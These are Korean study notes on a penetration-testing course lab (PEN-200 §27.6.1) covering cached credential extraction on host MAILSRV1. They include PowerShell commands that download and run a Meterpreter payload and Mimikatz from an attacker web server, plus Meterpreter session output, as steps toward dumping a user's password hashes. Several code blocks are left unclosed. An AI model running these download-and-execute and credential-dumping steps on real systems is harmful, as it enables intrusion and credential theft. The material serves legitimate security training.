# 27.6.1 캐시된 자격 증명

> **Cached Credentials** · PEN-200 §27.6.1

MAILSRV1 에서 특권 코드 실행을 얻었으므로 다음은 이 시스템에 활성 세션을 가진 beccy 의 비밀번호 해시 추출임.

⚠️ 침투 테스트의 목적에 따라 다르지만 **MAILSRV1 자체의 로컬 열거를 건너뛰지 말 것** — 해시 추출로 곧장 달려가면 추가 취약점과 민감 정보를 놓침.

AV 부재를 확인한 뒤 앞서 만든 `met.exe` 를 내려받아 실행해 셸을 Meterpreter 로 승격함 — 사후 침투(post-exploitation)가 수월해짐.

```
PS C:\Windows\system32> cd C:\Users\Administrator
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
PS C:\Users\Administrator> .\met.exe
```

```
[*] Sending stage (200774 bytes) to 192.168.50.242
[*] Meterpreter session 2 opened (192.168.119.5:443 -> 192.168.50.242:50814)
```
*세션 2 확보 — 스테이지 전송 후 핸들러가 세션을 염*

Metasploit 에 세션이 붙으면 `sessions -i 2` 로 진입, `shell` → `powershell` 순으로 PowerShell 셸 확보.

```

meterpreter > shell

*`shell` 로 `cmd` 를 얻은 뒤 다시 `powershell` 을 띄움 — Mimikatz 실행 전 단계*

Kali 에서 최신 Mimikatz 를 8000 번 포트 Python3 웹 서버로 서빙하고, MAILSRV1 에서 `iwr` 로 내려받아 실행함.

```
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile
mimikatz.exe
PS C:\Users\Administrator> .\mimikatz.exe

*Mimikatz 내려받기와 기동 — `-Outfile` 과 파일명이 나뉜 것은 교재 지면 폭 때문임*

> ⚠️ **교재 표기 불일치** — 입력은 `.\mimikatz.exe` 인데 바로 아래 반향 줄은 `.\mimi.exe` 임. 교재 캡처 자체의 불일치이며 실행 파일명은 내려받은 `mimikatz.exe` 임.
